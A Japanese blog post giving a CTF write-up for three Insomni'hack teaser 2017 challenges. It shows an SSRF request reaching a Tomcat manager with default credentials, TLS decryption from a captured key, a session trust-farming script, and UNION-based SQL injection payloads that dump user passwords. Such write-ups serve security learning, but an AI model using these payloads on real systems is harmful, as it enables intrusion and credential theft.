---
layout: post
title: Insomni'hack teaser 2017 の write-up
categories: [ctf]
date: 2017-01-23 22:06:00 +0900
---

チーム Harekaze で [Insomni'hack teaser 2017](https://teaser.insomnihack.ch/) に参加しました。

最終的にチームで 350 点を獲得し、順位は 69 位 (得点 339 チーム中) でした。うち、私は 3 問を解いて 300 点を入れました。

ということで解いた問題の write-up です。今年はなるべく参加した CTF の write-up を書くよう頑張ります。

## [Web 50] smarttomcat

Latitude に 12、Longitude に 34 を入力して検索すると、`http://smarttomcat.teaser.insomnihack.ch/index.php` に `u=http://localhost:8080/index.jsp?x=12&y=34` という内容で POST をしている様子でした。

試しに `curl -d "u=http://localhost:8080/hoge" http://smarttomcat.teaser.insomnihack.ch/` を実行すると、`Apache Tomcat/7.0.68 (Ubuntu) - Error report` というタイトルの HTML が返ってきました。これで `localhost:8080` で動いているのは Apache Tomcat と分かります。

`http://localhost:8080/manager/html/` を投げると、`This request requires HTTP authentication.` という内容の HTML が帰ってきました。ユーザ名とパスワードをエスパーして `http://tomcat:tomcat@localhost:8080/manager/html/` を投げるとフラグが表示されました。

```
INS{th1s_is_re4l_w0rld_pent3st}
```

## [Forensics 50] The Great Escape - part 1

問題の pcapng 形式のファイルを pcap に変換して NetworkMiner に投げると、`ssc.key` というファイルをアップロードしている様子が確認できました。

`172.31.36.141:443` との通信をこの `ssc.key` で Wireshark を使って復号すると、`FLAG: INS{OkThatWasWay2Easy}` という文字列がありました。

```
INS{OkThatWasWay2Easy}
```

## [Web 200] Shobot

`http://shobot.teaser.insomnihack.ch/?page=article&artid=9'%20or%201;%23` にアクセスしてみると `You're not trusted enough to do this action now!` と怒られました。ソースを見ると

```javascript
var TRUST_ACTIONS = [{
    "parameter": "artid",
    "validation": "ctype_digit",
    "movement": "-30",
    "newTrust": -29
}, {
    "parameter": "artid",
    "validation": "valid_against_sql_pattern",
    "movement": "-70",
    "newTrust": -99
}]
```

とありました。また、`<!--<div class="menu-entry"><a href="?page=admin">Admin</a></div>-->` というような形でリンクがコメントアウトされていました。Cookie の PHPSESSID を削除して `Musclebot` を購入してみると

```javascript
var TRUST_ACTIONS = [{
    "parameter": null,
    "validation": "add_to_cart",
    "movement": 3,
    "newTrust": 4
}, {
    "parameter": null,
    "validation": "valid_cart",
    "movement": 10,
    "newTrust": 14
}]
```

となっていました。自動でロボットの購入をして、`newTrust` を 100 以上にしてくれるスクリプトを書きましょう。

```python
import requests
import uuid

url1 = 'http://shobot.teaser.insomnihack.ch/?page=article&artid=1&addToCart'
url2 = 'http://shobot.teaser.insomnihack.ch/?page=cartconfirm'

while True:
  session_id = str(uuid.uuid4())
  cookies = {
    'PHPSESSID': session_id
  }
  for _ in range(8):
    requests.get(url1, cookies=cookies)
    requests.get(url2, cookies=cookies)
  input(session_id)
```

出力されたセッション ID をセットして `/?page=article&artid=9%27%20or%201;%23` にアクセスしてみると artid が 1 のときに表示されるはずの `Shogirl` のデータが表示されました。SQLi ができるようです。

`9' or 1 order by 5;#` でカラム数を特定、5 個と分かりました。  
`9' and 0 union select 1, group_concat(table_name, 0x3a, column_name), 3, 4, 5 from information_schema.columns where table_schema=database();#` でテーブル名とカラム名を特定、`shbt_user` というテーブルが `shbt_userid` `shbt_username` `shbt_userpassword` というカラムを持つと分かりました。  
`9' and 0 union select 1, group_concat(shbt_username, 0x3a, shbt_userpassword), 3, 4, 5 from shbt_user;#` でそのテーブルからユーザ名とパスワードを抜き出しました。`sh0b0t4dm1n` というユーザは `N0T0R0B0TS$L4V3Ry` というパスワードのようです。

`/?page=admin` にこのユーザ名とパスワードでログインすると、フラグが表示されました。

```
INS{##r0b0tss!4v3ry1s!4m3}
```

## 感想

`[Web 200] The Great Escape - part 2` も解きたかったのですが、体調がよろしくなかったので諦めました。インフルエンザには気を付けましょう。